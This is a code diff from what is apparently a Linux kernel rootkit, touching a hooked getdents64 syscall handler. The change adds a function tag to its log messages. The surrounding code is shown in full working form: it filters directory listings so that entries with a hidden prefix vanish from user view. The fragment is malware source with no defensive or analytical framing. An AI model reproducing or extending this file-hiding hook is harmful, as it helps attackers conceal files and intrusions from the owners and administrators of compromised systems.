@@ -35,13 +35,13 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs) {
 
     kernel_dir_buffer = kmalloc(ret, GFP_KERNEL);
     if (!kernel_dir_buffer) {
-        rk_err("getdents64() failed to allocate kernel buffer\n");
+        rk_err("[hook_getdents64] getdents64() failed to allocate kernel buffer\n");
         return -ENOMEM;
     }
 
     if (copy_from_user(kernel_dir_buffer, user_dir, ret)) {
         kfree(kernel_dir_buffer);
-        rk_err("getdents64() failed to copy kernel buffer\n");
+        rk_err("[hook_getdents64] getdents64() failed to copy kernel buffer\n");
         return -EFAULT;
     }
 
@@ -49,7 +49,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs) {
         current_entry = (void *)((char *)kernel_dir_buffer + offset);
 
         if (is_hidden_name(current_entry->d_name, HIDDEN_PREFIX)) {
-            rk_info("getdents64() returned hidden entry: %s\n", current_entry->d_name);
+            rk_info("[hook_getdents64] getdents64() returned hidden entry: %s\n", current_entry->d_name);
 
             unsigned int bytes_to_hide = current_entry->d_reclen;
 
@@ -67,7 +67,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs) {
 
     if (copy_to_user(user_dir, kernel_dir_buffer, ret)) {
         kfree(kernel_dir_buffer);
-        rk_err("getdents64() failed to copy to user buffer\n");
+        rk_err("[hook_getdents64] getdents64() failed to copy to user buffer\n");
         return -EFAULT;
     }
 
